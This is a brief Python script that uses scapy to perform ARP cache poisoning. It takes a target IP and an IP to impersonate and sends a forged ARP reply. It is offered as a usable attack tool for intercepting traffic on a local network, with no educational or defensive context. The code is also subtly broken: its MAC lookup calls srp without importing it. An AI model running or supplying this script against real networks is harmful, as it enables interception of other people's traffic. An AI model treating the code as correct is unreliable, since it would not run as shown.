import argparse
from scapy.all import Ether, ARP, sendp

def arp_poison(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(arp)

def get_mac(ip):
    arp = ARP(op=1, pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    return result[0][1].hwsrc

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='target IP address')
    parser.add_argument('spoof', help='spoofed IP address')
    args = parser.parse_args()

    arp_poison(args.target, args.spoof)
